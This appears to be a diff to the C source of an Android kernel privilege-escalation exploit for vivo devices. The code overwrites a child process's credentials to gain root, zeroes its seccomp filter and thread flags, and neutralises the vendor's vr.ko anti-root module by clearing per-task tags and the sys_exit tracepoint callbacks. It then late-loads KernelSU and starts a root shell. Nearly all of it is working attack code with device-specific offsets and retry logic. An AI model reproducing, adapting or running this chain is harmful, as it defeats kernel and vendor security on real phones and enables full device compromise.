@@ -961,7 +961,7 @@ static void write_safe_mode_file(void) {
 
 static void park_rooted_child(void) {
   /* This task parks forever on purpose, but it still holds every descriptor
-   * the parent opened -- including the manager's stdout/stderr pipe. The
+   * the parent opened -- including the manager stdout/stderr pipe. The
    * caller reads that pipe until EOF, so a parked child that keeps the write
    * end open turns a fully successful run into an install UI stuck on
    * "running". Cut ourselves loose from stdio before parking. */
@@ -1397,3 +1397,303 @@ int run_exploit(int argc, char **argv) {
   /* ------------------------------------------------------------------
    * vivo vr.ko anti-root per-task bypass (ported from root.c)
    * ------------------------------------------------------------------
+   * vr.ko tags every app-origin task at fork/clone time. When the task
+   * later holds euid 0, the sys_exit tracepoint probe kills it. We must
+   * strip the tag BEFORE W2 verify runs the child's getuid().
+   *
+   * This exploit primitive is 64-bit granular, so:
+   *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
+   *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
+   *     off the sys_exit slow-path immediately.
+   *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
+   *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
+   *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
+   * ------------------------------------------------------------------ */
+  {
+    static int vr_needed = -1;
+    if (vr_needed < 0) {
+      vr_needed = 1; /* /proc/modules unreadable: assume loaded */
+      FILE *m = fopen("/proc/modules", "r");
+      if (m) {
+        char mod[256];
+        vr_needed = 0;
+        while (fgets(mod, sizeof(mod), m))
+          if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_'))
+            { vr_needed = 1; break; }
+        fclose(m);
+      }
+      pr_info("vr.ko %s\n", vr_needed ? "loaded; clearing tags"
+                                      : "not loaded; skipping tag clear");
+      const char *skip_vr = getenv("GHOSTLOCK_SKIP_VR");
+      if (skip_vr && skip_vr[0] && skip_vr[0] != '0') {
+        pr_warning("VR: skipped by GHOSTLOCK_SKIP_VR\n");
+        vr_needed = 0;
+      }
+    }
+
+    int vr_ok = 1;
+    if (vr_needed) {
+      /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+      vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
+                            "VR: flags+tagA", 1, 1);
+
+      /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+      if (vr_ok) {
+        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
+        vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
+      }
+
+      if (vr_ok) {
+        pr_success("VR.ko per-task tags cleared\n");
+      } else {
+        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
+      }
+    }
+  }
+#endif
+
+    pselect_child_node = 1;
+
+    int got_root = retry_write_stage(
+        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 100000,
+        verify_w2_stage, &w2_context, 0);
+    if (!got_root) {
+      write(pipes.cmd_w, "X", 1);
+      close(pipes.cmd_w); close(pipes.uid_r);
+      pr_warning("W2 failed after 15 rounds\n");
+      waitpid(child, NULL, WNOHANG);
+      return 1;
+    }
+    ever_rooted = 1;
+    /* rooted children never exit; chain failures park (P) */
+
+    /* W3: clear the child's seccomp filter for the independent root shell
+     * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
+     * must be zeroed too; do both writes back-to-back with one probe
+     * (real finit_module calls trip vendor root guards).
+     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
+     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
+     * probe to tell [target] from [target+8]. */
+    if (!process_has_seccomp()) {
+      pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
+      seccomp_ok = 1;
+      break;
+    }
+
+    int tcp_writes = tcp_route_selected();
+    struct w3_stage_context w3_context = {
+      .pipes = &pipes,
+      .leaf_to_target8 = 0,
+    };
+    if (!tcp_writes) {
+      /* a failed probe must not pick a side, guessing [target+8] would zero
+       * the word before it, inside the task struct */
+      if (!retry_write_stage(
+              "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
+              verify_leaf_dir_stage, &w3_context, 1)) {
+        if (child_alive) {
+          write(pipes.cmd_w, "X", 1);
+          waitpid(child, NULL, WNOHANG);
+          /* the next round takes over the pipe fds */
+          child_alive = 0;
+        }
+        pr_warning("W3 leaf direction probe failed; not writing blind\n");
+        continue;
+      }
+    }
+
+    uintptr_t flags_target = w3_context.leaf_to_target8
+      ? child_task - 8
+      : child_task + TASK_THREAD_INFO_FLAGS_OFF;
+    uintptr_t mode_target = w3_context.leaf_to_target8
+      ? child_task + TASK_SECCOMP_OFF - 8
+      : child_task + TASK_SECCOMP_OFF;
+
+    for (int attempt = 1; attempt <= 6; attempt++) {
+      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
+      if (attempt == 1) slab_drain();
+      int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
+      if (!routed) {
+        pr_warning("W3 attempt %d route failed; backing off\n", attempt);
+        usleep(100000);
+        continue;
+      }
+      usleep(50000);
+      routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
+      if (!routed) {
+        pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
+        usleep(100000);
+        continue;
+      }
+      usleep(50000);
+      int st = 0;
+      if (waitpid(child, &st, WNOHANG) == child) {
+        pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
+        child_alive = 0;
+        break;
+      }
+      if (verify_seccomp_probe_stage(&w2_context)) {
+        seccomp_ok = 1;
+        break;
+      }
+      usleep(50000);
+    }
+
+    if (!seccomp_ok) {
+      pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
+      continue; /* respawn and redo the chain */
+    }
+    pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
+    break;
+  }
+
+  if (!seccomp_ok)
+    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");
+
+  /* -------------------------------------------------------------------
+   * vr.ko global neutralize: zero __tracepoint_sys_exit.funcs so the
+   * sys_exit probe callback is never invoked (prevents vr.ko from
+   * killing KernelSU/ksud processes). Must run BEFORE late-load.
+   *
+   * NOTE: data_addr() takes an ABSOLUTE image address, so we must add
+   * KIMAGE_TEXT_BASE to the kbase-relative offset from offsets.json.
+   * (The previous attempt passed the raw offset and produced the bogus
+   *  address 0xffffffbf822f3610 -> kernel panic.)
+   *
+   * leaf=1 mode=1 == "store 0 at target" (same as the W3 TIF_SECCOMP write).
+   * ------------------------------------------------------------------- */
+#ifdef VR_TAG_A_OFF
+  /* Resolve the __tracepoint_sys_exit.funcs offset the same way the upstream
+   * vr.ko work does: offsets.json carries the ABSOLUTE __tracepoint_sys_exit
+   * image offset; the `funcs` field sits at +TRACEPOINT_FUNCS_OFF inside the
+   * struct, which moved 0x40 -> 0x48 when `probestub` was added in 6.6.
+   * Writing 0x10 (the pre-6.6 assumption) hit static_call_key instead of funcs:
+   * the probe stayed registered and the corrupted static call panicked the
+   * kernel at probe registration time. */
+  if (active_offsets && ever_rooted) {
+    uint64_t tp_tp_off = active_offsets->off_tp_sys_exit_tp;
+    uint64_t funcs_off = TRACEPOINT_FUNCS_OFF_6_1;
+    const char *rel = active_offsets->uname_r;
+    unsigned maj = 0, min = 0;
+    if (rel && sscanf(rel, "%u.%u", &maj, &min) == 2) {
+      if (maj > 6 || (maj == 6 && min >= 6))
+        funcs_off = TRACEPOINT_FUNCS_OFF_6_6;
+    }
+    if (!tp_tp_off && !active_offsets->off_tp_sys_exit_funcs) {
+      /* Loud on purpose: silently skipping this leaves vr.ko armed and ksud
+       * dies at late-load, which looks like an unrelated crash. */
+      pr_error("vr.ko neutralize SKIPPED: offsets.json has no "
+               "off_tp_sys_exit_tp / off_tp_sys_exit_funcs\n");
+      pr_error("vr.ko will kill the late-loaded ksud\n");
+      log_sync();
+    }
+    if (tp_tp_off) {
+      uintptr_t tp_va = data_addr(KIMAGE_TEXT_BASE + tp_tp_off);
+      uintptr_t funcs_va = tp_va + funcs_off;
+      pr_info("vr.ko neutralize: __tracepoint_sys_exit @0x%016zx "
+              "funcs_off=0x%llx -> zeroing @0x%016zx\n",
+              tp_va, (unsigned long long)funcs_off, funcs_va);
+      /* The script reads this exact address; devmem width is BYTES (max 8). */
+      write_tp_phys_file(p0_kernel_phys_load + tp_tp_off + funcs_off);
+      int vr_global_ok = 0;
+      for (int attempt = 1; attempt <= 5 && !vr_global_ok; attempt++) {
+        vr_global_ok = do_one_write(funcs_va, "VR: sys_exit tp->funcs", 1, 1);
+        if (!vr_global_ok) {
+          pr_warning("vr.ko neutralize attempt %d failed, retrying\n", attempt);
+          usleep(50000);
+        }
+      }
+      if (vr_global_ok)
+        pr_success("vr.ko sys_exit tracepoint funcs zeroed (attempt %d)\n", 1);
+      else
+        pr_warning("vr.ko tracepoint neutralize route failed (5 attempts)\n");
+    } else if (active_offsets->off_tp_sys_exit_funcs) {
+      /* Legacy offsets.json: value already points at the funcs field. */
+      uintptr_t funcs_va = data_addr(KIMAGE_TEXT_BASE +
+                                     active_offsets->off_tp_sys_exit_funcs);
+      pr_info("vr.ko neutralize (legacy offset): funcs @0x%016zx\n", funcs_va);
+      write_tp_phys_file(p0_kernel_phys_load +
+                         active_offsets->off_tp_sys_exit_funcs);
+      int vr_global_ok = 0;
+      for (int attempt = 1; attempt <= 5 && !vr_global_ok; attempt++)
+        vr_global_ok = do_one_write(funcs_va, "VR: sys_exit tp->funcs", 1, 1);
+      if (vr_global_ok)
+        pr_success("vr.ko sys_exit tracepoint funcs zeroed (legacy)\n");
+      else
+        pr_warning("vr.ko tracepoint neutralize route failed (legacy)\n");
+    }
+  }
+#endif
+
+  sleep(2);
+  TIMER("exploit complete");
+  if (!ever_rooted) {
+    pr_error("w2 never rooted a child\n");
+    return 1;
+  }
+  if (child_alive) {
+    ssize_t gw = write(pipes.cmd_w, "G", 1);
+    pr_info("parent: 'G' write -> %zd errno=%d (child_alive=1)\n", gw, errno);
+    if (gw != 1)
+      pr_warning("failed to start root shell (child exited early)\n");
+    close(pipes.cmd_w);
+    waitpid(child, NULL, WNOHANG);
+    if (parked_cmd_w >= 0) close(parked_cmd_w);
+  } else if (parked_child > 0) {
+    if (write(parked_cmd_w, "G", 1) != 1)
+      pr_warning("failed to start root shell (parked child exited)\n");
+    close(parked_cmd_w);
+    waitpid(parked_child, NULL, WNOHANG);
+    parked_cmd_w = -1;
+  } else {
+    pr_warning("skipping late-load: child died during W3\n");
+  }
+  close(pipes.uid_r);
+
+  int kernelsu_ready = 0;
+  for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
+    usleep(100000);
+  }
+  /* untrusted_app loses /proc/modules once enforcing is restored, so poll
+   * the app-readable log for the loaded-module line (up to ~30s). */
+  int ksu_log_loaded = 0;
+  int ksu_log_failed = 0;
+  for (int i = 0; i < 60 && !ksu_log_failed && !ksu_log_loaded; i++) {
+    FILE *lf = fopen(g_ksu_log_path, "r");
+    if (lf) {
+      char line[256];
+      while (fgets(line, sizeof(line), lf)) {
+        if (strstr(line, "[+] KernelSU module loaded") ||
+            strstr(line, "[+] kernelsu already loaded"))
+          ksu_log_loaded = 1;
+        if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
+      }
+      fclose(lf);
+    }
+    if (!ksu_log_failed && !ksu_log_loaded) usleep(500000);
+  }
+  kernelsu_ready = kernelsu_ready || ksu_log_loaded;
+  /* enforcing takes the app dir away from the root script, so its log stops
+   * before the restore. the state has to be read from here. */
+  int enforced = 0;
+  for (int i = 0; i < 20 && !(enforced = !check_selinux_off()); i++)
+    usleep(500000);
+  if (enforced)
+    pr_success("enforcing restored\n");
+  else
+    pr_warning("SELinux left permissive\n");
+
+  /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
+   * policy reload keeps it working after enforcing is back. */
+  if (kernelsu_ready)
+    pr_success("KernelSU ready\n");
+  else if (ksu_log_failed)
+    pr_warning("KernelSU module load failed\n");
+  else if (seccomp_ok)
+    pr_warning("temporary root ready; KernelSU module load pending\n");
+  else
+    pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
+  return 0;
+}
+
+int main(int argc, char **argv) { return run_exploit(argc, argv); }
